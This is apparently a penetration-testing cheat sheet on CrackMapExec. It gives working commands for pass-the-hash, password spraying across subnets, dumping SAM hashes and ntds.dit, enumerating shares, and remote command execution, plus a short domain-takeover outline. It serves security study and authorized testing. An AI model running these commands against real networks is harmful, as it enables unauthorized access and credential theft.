---
title: CrackMapExec
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - dump hashes
  - passwords
---
 # CrackMapExec

Once we have access to a domain, CrackMapExec (CME) will allow us to sweep the network and see which users and machines we can access to.

CME allows us to authenticate ourselves with the following protocols:

- smb
- ssh
- mssql
- ldap
- winrm

The most used protocol is smb as port 445 is commonly open.

CME offers a help menu for each protocol (i.e., `crackmapexec winrm -h`). 

## Installation

```bash
sudo apt-get -y install crackmapexec
```


## Basic usage

Main syntax

```bash
crackmapexec <protocol> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

Main flags:

- -u Username `The user whose credentials we will use to authenticate`
- -p Password `User's password`
- Target (IP or FQDN) `Target host to enumerate` (in our case, the Domain Controller)
- --users `Specifies to enumerate Domain Users`
- --groups `Specifies to enumerate domain groups`
- --loggedon-users `Attempts to enumerate what users are logged on to a target, if any`

>If we see `Pwn3d!`, it means that the user is a local administrator on the target computer.

### Access the machine

```bash
# Check if we can access a machine
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN>

# Using a hash instead of a password, to authenticate ourselves: Pass the hash attack (PtH)
crackmapexec smb $ip -u <username> -H <hash> -d <DOMAIN>

```

### Basic enumeration

```powershell
# Enumerate active sessions
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --sessions

# Obtain the password policy
crackmapexec smb $ip -u <username> -p <password> --pass-pol


# Spraying password with crackmapexec
crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
# -H: hash

# Get sam: extract hashes from all users authenticated in the machine 
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --sam

# Get the ntds.dit, given that your user has permissions
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --ntds

# Check which machines we can access in a subnet
crackmapexec smb $ip/24 -u <username> -p <password> -d <DOMAIN>

# Enumerate logged on users in other hosts of the domain
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --loggedon-users

# Enumerate users of the domain
sudo crackmapexec smb  $ip -u <username> -p <password> -d <DOMAIN> --users

crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --users

# Enumerate groups of the domain
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --groups

```

### Enumerate shares

```powershell
# See shares
# Local auth
crackmapexec smb $ip --local-auth -u <username> -p <password> --shares
# Doimain
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --shares

# The module spider_plus will dig through each readable share on the host and list all readable files. 
sudo crackmapexec smb  $ip --local-auth -u <username> -p <password> -d <DOMAIN> -M spider_plus --share 'NameOfShare'
# CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>
```

### RCE with crackmapexec

```bash
#  If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.
crackmapexec smb $ip -u Administrator -p '<password>' -x 'whoami' --exec-method smbexec
```

Sometimes we cannot get execution with smbexec method for several reasons. One of them may be  that the `--exec-method smbexec` relies on specific services to be running, such as the Remote Procedure Call (RPC) or Server Message Block (SMB). Try an alternate execution method:

```bash
crackmapexec smb $ip -u Administrator -p '<password>' -x  'whoami' --exec-method wmiexec

crackmapexec smb $ip -u Administrator -p '<password>' -x  'whoami' --exec-method atexec
```

Also, the `smbexec` method requires:
    - A writable `\C$\Windows\Temp` directory.
    - Permissions to copy files to the target machine.
 
If these conditions are not met, execution will fail.


## Basic technique

Once we have access to  a domain:

1. Enumerate users and machines in our machine: we will have all users registered and their hashes. 

2. See if any user is in another machine of the domain. Also check if they have admin access.

3. Goal would be to dump ntds.dit.

With krbtgt and DC$ user you can get a golden ticket. And with DC$ a silver ticket.


## What is a SAM hash like?

Take the Administrator one:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Basically, it has 4 parts: 

					user : id: LM-authentication : NTLM

For the purpose of using the hash with CrackMapExec, we will user the NTLM part.









